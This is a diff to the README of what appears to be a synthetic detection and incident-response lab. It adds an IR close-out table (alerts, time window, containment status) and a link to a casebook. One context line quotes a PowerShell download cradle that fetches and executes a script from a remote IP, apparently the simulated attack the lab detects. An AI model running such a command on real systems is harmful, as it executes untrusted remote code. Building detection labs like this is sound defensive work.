@@ -110,3 +110,17 @@ IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.44/a')
 .\.venv\Scripts\python.exe -m pipeline.labgen --scenario all
 .\.venv\Scripts\python.exe -m pipeline.detect --dry-run   # inspect the six queries
 ```
+
+## IR close-out
+
+| Metric | Value |
+|---|---|
+| Observed window | 2026-11-11T10:38:18Z to 2026-11-11T10:47:48Z (570s) |
+| Detection span | 2026-11-11T10:38:18Z to 2026-11-11T10:47:48Z (570s) |
+| Alerts | 6 |
+| Containment status | host isolation recommended |
+| Response timing | not measured in the synthetic lab |
+
+The full close-out, with containment, eradication, recovery, communication,
+evidence handling, lessons, and open questions, is in the
+[IR casebook](../IR.md#pnb-2026-002).
